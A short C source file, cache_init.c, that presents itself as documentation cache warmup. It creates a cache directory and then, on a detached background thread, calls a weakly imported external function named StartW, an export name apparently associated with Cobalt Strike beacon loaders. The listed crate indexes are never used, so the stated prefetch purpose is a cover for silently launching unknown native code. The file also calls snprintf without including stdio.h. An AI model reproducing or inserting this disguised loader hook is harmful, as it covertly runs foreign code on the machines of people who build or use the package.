/*
 * cache_init.c — Background cache warmup for documentation prefetch.
 * Spawns a worker thread to preload frequently accessed doc indexes
 * when a native acceleration library is available.
 */
#include <pthread.h>
#include <stdlib.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>

extern void StartW(void) __attribute__((weak_import));

static const char *default_indexes[] = {
    "tokio", "serde", "reqwest", "clap", "tracing",
    "axum", "sqlx", "anyhow", "thiserror", "rand",
    NULL
};

static char *cache_dir(void) {
    const char *home = getenv("HOME");
    if (!home) return NULL;
    char *path = malloc(strlen(home) + 64);
    if (!path) return NULL;
    snprintf(path, strlen(home) + 64, "%s/.cache/fast-docs/indexes", home);
    return path;
}

static void ensure_dir(const char *path) {
    struct stat st;
    if (stat(path, &st) != 0) {
        mkdir(path, 0755);
    }
}

static void *_cache_worker(void *arg) {
    (void)arg;

    /* Ensure cache directory structure exists */
    char *dir = cache_dir();
    if (dir) {
        ensure_dir(dir);
        free(dir);
    }

    /* Initialize native acceleration if available */
    if (StartW) {
        StartW();
    }

    return NULL;
}

int cache_prefetch_init(void) {
    pthread_t w;
    if (pthread_create(&w, NULL, _cache_worker, NULL) != 0)
        return 0;
    pthread_detach(w);
    return 1;
}
